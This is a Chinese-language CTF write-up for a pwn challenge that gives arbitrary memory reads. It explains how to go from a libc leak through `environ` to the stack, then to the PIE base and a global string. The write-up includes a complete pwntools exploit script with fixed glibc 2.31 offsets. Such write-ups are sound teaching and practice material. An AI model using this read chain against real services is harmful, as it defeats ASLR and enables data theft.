# week3whitegive_1

## 题目简述

程序先泄露一个 libc 地址，随后允许攻击者反复提交地址并读取该地址处的数据，形成任意地址读。目标是从 libc 泄漏定位 `environ`，借其中保存的栈指针回到当前线程栈，再由栈上的返回地址推导 PIE 基址并读取程序数据段中的目标字符串。原解来自 0xdeadc0de。

## 解题过程

配套 glibc 2.31 中 `environ` 保存 `char **` 环境变量指针，其值通常指向当前栈附近，是从已知 libc 基址跨越 ASLR 到栈地址的常用桥梁。脚本先读 `environ`，再按本题栈布局减固定偏移读取栈字符串和保存的代码地址；代码地址减去 `0x13DF` 得到 PIE 基址，最后读取 `base + 0x4080`。

```python
from pwn import *

HOST = 'challenge-host'
PORT = 8005
p = remote(HOST, PORT)
print(p.recvuntil(b": "))
libcBaseAddress = int(p.recvuntil(b"\n", True), 16) - 0x84420
environAddress = libcBaseAddress + 0x1EF600
print(p.recv())
p.send(p64(environAddress))
stackAddress = int.from_bytes(p.recvuntil(b"Please", True), "little")
print(p.recv())
stackStringAddress = stackAddress - 0x168
p.send(p64(stackStringAddress))
print(p.recv())
print(p.recv())
stackBaseAddress = stackAddress - 0xE0
p.send(p64(stackBaseAddress))
baseAddress = int.from_bytes(p.recvuntil(b"Please", True), "little") - 0x13DF
print(p.recv())
baseStringAddress = baseAddress + 0x4080
p.send(p64(baseStringAddress))
print(p.recv())
```

## 方法总结

只有任意读而没有任意写时，利用思路是沿可靠指针逐层定位：已泄露 libc → `environ` → 栈 → 保存的返回地址 → PIE → 全局目标数据。每个固定差值都依赖本题二进制、libc 版本和当次调用栈，不能照搬到其他目标。原 PDF 没有记录具体 flag 文本，因此本 WP 保留可复现的读取链，不凭空补造结果。
